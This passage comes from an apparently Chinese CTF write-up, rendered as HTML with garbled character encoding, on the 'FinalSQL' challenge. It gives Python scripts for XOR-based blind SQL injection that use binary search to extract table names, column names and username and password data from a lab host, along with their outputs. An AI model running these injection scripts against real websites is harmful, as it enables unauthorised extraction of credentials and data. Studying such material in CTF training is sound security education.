urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="hljs-comment"># table_lenå­˜å‚¨æ¯å¼ è¡¨çš„é•¿åº¦</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = []<br><span class="hljs-comment"># indexå­˜å‚¨ç°åœ¨å¤„ç†çš„æ˜¯ç¬¬index+1å¼ è¡¨</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># ç”±äºè·å–çš„æ˜¯æ‰€æœ‰è¡¨åæ€»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦éå†ä¸€æ¬¡å³å¯</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># nè¡¨ç¤ºå½“å‰å¤„ç†çš„è¡¨æ‰€å¤„ç†çš„æ˜¯ç¬¬nä¸ªå­—ç¬¦</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># å­˜å‚¨è¯¥è¡¨çš„è¡¨å</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># æ‰“å°è¯¥è¡¨çš„è¡¨å</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&#123;&#125;å¼ è¡¨çš„åå­—ä¸º&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªè¡¨</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç¬¬1å¼ è¡¨çš„åå­—ä¸ºF1naI1y,<br>[&#x27;F1naI1y,                      &#x27;]<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¾—åˆ°åªæœ‰è¡¨:F1naI1y</p><p>ç¬¬å››æ­¥ï¼šç›´æ¥çˆ†è¡¨çš„å­—æ®µå,æ‰‹åŠ¨è§„å®šå­—æ®µåæ€»é•¿50ï¼Œä½¿ç”¨GROUP_CONCAT()å°†è¯¥å¼ è¡¨çš„æ‰€æœ‰å­—æ®µåç»„åˆåœ¨ä¸€èµ·</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_numå­˜å‚¨æ¯å¼ è¡¨æ¯ä¸ªå­—æ®µæ‰€å¯¹åº”çš„é•¿åº¦</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;F1naI1yç¬¬1å­—æ®µçš„é•¿åº¦&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = [<span class="hljs-string">&#x27;F1naI1y&#x27;</span>]<br><span class="hljs-comment"># col_countå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µæ•°</span><br><span class="hljs-comment"># å°†æ‰€æœ‰å­—æ®µåˆåœ¨ä¸€èµ·è¾“å‡ºå°±æ˜¯åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>col_count = &#123;<span class="hljs-string">&#x27;F1naI1y&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_nameå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µçš„åå­—</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆå¯¹è¡¨è¿›è¡Œéå†,åªæœ‰è¡¨F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># å½“å‰è¡¨çš„åå­—:table_name[table_index]</span><br>    <span class="hljs-comment"># col_numå­˜å‚¨å½“å‰è¡¨çš„å­—æ®µæ•°</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># å¯¹å½“å‰è¡¨çš„å­—æ®µè¿›è¡Œéå†ï¼Œè·å–å…¨éƒ¨å­—æ®µåï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_keyå­˜å‚¨å½“å‰è¡¨å½“å‰å­—æ®µçš„key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;ç¬¬&#123;&#125;å­—æ®µçš„é•¿åº¦&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_lenå­˜å‚¨å½“å‰å­—æ®µçš„é•¿åº¦</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># éå†å½“å‰å­—æ®µ</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># nameå­˜å‚¨å½“å‰å­—æ®µçš„åç§°</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>            <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>                <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.1</span>)<br>                <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>                true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># å­˜å‚¨å½“å‰å­—æ®µçš„åç§°:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;çš„ç¬¬&#123;&#125;ä¸ªå­—æ®µçš„åå­—&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—æ®µ</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€å¼ è¡¨</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">F1naI1yçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—:id,username,password<br>&#123;&#x27;F1naI1yçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—&#x27;: &#x27;id,username,password                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äº”æ­¥ï¼šçˆ†å­—æ®µçš„æ•°æ®:</p><p>çˆ†usernameçš„æ•°æ®:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828134250862-1693214990370-12.png" alt="image-20230828134250862"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">100</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">usernameå­—æ®µç¬¬1åˆ—çš„å€¼:mygod,welcome,site,site,site,site,Syc,finally,flag<br></code></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€ä¸ªflag,çŒœæµ‹flagåœ¨username&#x3D;flagæ‰€å¯¹åº”çš„å­—æ®µpasswordä¸­</p><p>çˆ†passwordå­—æ®µçš„å€¼ï¼ŒæŒ‡å®šusername&#x3D;flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># 